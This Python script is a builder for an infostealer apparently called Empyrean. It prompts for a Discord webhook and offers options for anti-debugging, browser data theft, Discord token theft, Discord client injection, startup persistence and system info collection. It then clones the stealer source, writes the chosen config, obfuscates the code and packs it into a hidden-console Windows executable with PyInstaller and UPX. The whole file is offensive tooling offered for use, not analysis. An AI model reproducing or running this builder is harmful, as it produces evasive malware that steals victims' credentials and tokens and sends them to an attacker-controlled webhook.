import zipfile
import os
import shutil
import subprocess
import re
import requests
from InquirerPy import prompt  # type: ignore


class Config:
    """
    The Config class creates the questions that will be prompted to the user
    and return the configuration data
    """

    def __init__(self) -> None:
        self.questions = [
            {
                "type": "input",
                "name": "webhook",
                "message": "Enter your webhook URL",
                "validate": (lambda x: False if re.match(r"https://(discord.com|discordapp.com)/api/webhooks/\d+/\S+", x) is None else True)
            },
            {
                "type": "confirm",
                "name": "antidebug",
                "message": "Enable anti-debugging?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "browsers",
                "message": "Enable browser stealing?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "discordtoken",
                "message": "Enable Discord token stealing?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "injection",
                "message": "Enable Discord injection?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "startup",
                "message": "Enable startup?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "systeminfo",
                "message": "Enable system info?",
                "default": True,
            },
        ]

    def get_config(self) -> dict:
        """
        Prompt the user with the questions and return the config data
        """
        return prompt(self.questions)


class MakeEnv:
    """
    The MakeEnv class creates the build directory and clones the source code 
    """

    def __init__(self) -> None:
        self.build_dir = os.path.join(os.getcwd(), 'build')

    def make_env(self) -> None:
        """
        Creates the build directory
        """
        if os.path.exists(self.build_dir):
            shutil.rmtree(self.build_dir)

        os.mkdir(self.build_dir)

    def get_src(self) -> None:
        """
        Clones the source code from a specified repository into the build directory
        """
        subprocess.run(
            ['git', 'clone', 'https://github.com/addi00000/empyrean.git'], cwd=self.build_dir)
        shutil.move(os.path.join(self.build_dir,
                    'empyrean', 'src'), self.build_dir)


class WriteConfig:
    """
    The WriteConfig class writes the config data to the config file
    """

    def __init__(self, config: dict) -> None:
        self.config = config
        self.build_dir = os.path.join(os.getcwd(), 'build')
        self.config_file = os.path.join(self.build_dir, 'src', 'config.py')

    def write_config(self) -> None:
        """
        Writes the config data to the config file
        """
        with open(self.config_file, 'w') as f:
            f.write(f'__CONFIG__ = {self.config}')


class DoObfuscate:
    """
    Obfuscate code using https://github.com/0x3C50/pyobf2
    """

    def __init__(self) -> None:
        self.build_dir = os.path.join(os.getcwd(), 'build')
        self.src_dir = os.path.join(self.build_dir, 'src')
        self.obfuscator_config = ['[general]', f'input_file = "../src/main.py"', f'output_file = "../src/"', 'transitive = true', 'manual_include = []', 'overwrite_output_forcefully = false', '[removeTypeHints]', 'enabled = true', '[fstrToFormatSeq]', 'enabled = true', '[intObfuscator]', 'enabled = true', 'mode = "bits"', '[encodeStrings]', 'enabled = true',
                                  '[renamer]', 'enabled = false', 'rename_format = "f\'{kind}{get_counter(kind)}\'"', '[replaceAttribSet]', 'enabled = true', '[unicodeTransformer]', 'enabled = true', '[dynamicCodeObjLauncher]', 'enabled = false', '[varCollector]', 'enabled = true', '[compileFinalFiles]', 'enabled = false', '[packInPyz]', 'enabled = false', 'bootstrap_file = "__main__.py"']

    def get_obfuscator(self) -> None:
        """
        Clones the obfuscator from a specified repository into the build directory
        """
        subprocess.run(
            ['git', 'clone', 'https://github.com/0x3C50/pyobf2.git'], cwd=self.build_dir)
        subprocess.run(
            ['git', 'checkout', '4173bd1d47c360e1a66ac72c627b7efc478a16c8'], cwd=os.path.join(self.build_dir, 'pyobf2'))

    def write_config(self) -> None:
        """
        Writes the config data to the config file
        """
        with open(os.path.join(self.build_dir, 'pyobf2', 'config.toml'), 'w') as f:
            f.write('\n'.join(self.obfuscator_config))

    def execute_obfuscator(self) -> None:
        """
        Executes the obfuscator
        """
        subprocess.run(
            ['pip', 'install', '-r', 'requirements.txt'], cwd=os.path.join(self.build_dir, 'pyobf2'))
        subprocess.run(
            ['python', 'main.py'], cwd=os.path.join(self.build_dir, 'pyobf2'))


class Build:
    """
    The Build class downloads and installs the necessary packages and 
    then builds the source code
    """

    def __init__(self) -> None:
        self.build_dir = os.path.join(os.getcwd(), 'build')
        self.dist_dir = os.path.join(self.build_dir, '..', 'dist')

    def get_pyinstaller(self) -> None:
        """
        Downloads pyinstaller package
        """
        url = 'https://github.com/pyinstaller/pyinstaller/archive/refs/tags/v5.1.zip'

        with requests.get(url, stream=True) as r:
            with open(os.path.join(self.build_dir, 'pyinstaller.zip'), 'wb') as f:
                shutil.copyfileobj(r.raw, f)
        with zipfile.ZipFile(os.path.join(self.build_dir, 'pyinstaller.zip'), 'r') as zip_ref:
            zip_ref.extractall(self.build_dir)

    def get_upx(self) -> None:
        """
        Downloads UPX package
        """
        url = 'https://github.com/upx/upx/releases/download/v3.96/upx-3.96-win64.zip'

        with requests.get(url, stream=True) as r:
            with open(os.path.join(self.build_dir, 'upx.zip'), 'wb') as f:
                shutil.copyfileobj(r.raw, f)
        with zipfile.ZipFile(os.path.join(self.build_dir, 'upx.zip'), 'r') as zip_ref:
            zip_ref.extractall(self.build_dir)

    def build(self) -> None:
        """
        Builds the source code using pyinstaller and UPX
        """
        subprocess.run(['pyinstaller', '--onefile', '--noconsole', '--clean', '--distpath', self.dist_dir, '--workpath', os.path.join(
            self.build_dir, 'work'), '--specpath', os.path.join(self.build_dir, 'spec'), '--upx-dir', os.path.join(self.build_dir, 'upx-3.96-win64'), os.path.join(self.build_dir, 'src', 'main.py')])


def main() -> None:
    config = Config()
    config_data = config.get_config()

    make_env = MakeEnv()
    make_env.make_env()
    make_env.get_src()

    write_config = WriteConfig(config_data)
    write_config.write_config()

    do_obfuscate = DoObfuscate()
    do_obfuscate.get_obfuscator()
    do_obfuscate.write_config()
    do_obfuscate.execute_obfuscator()

    build = Build()
    build.get_pyinstaller()
    build.get_upx()
    build.build()


if __name__ == '__main__':
    main()
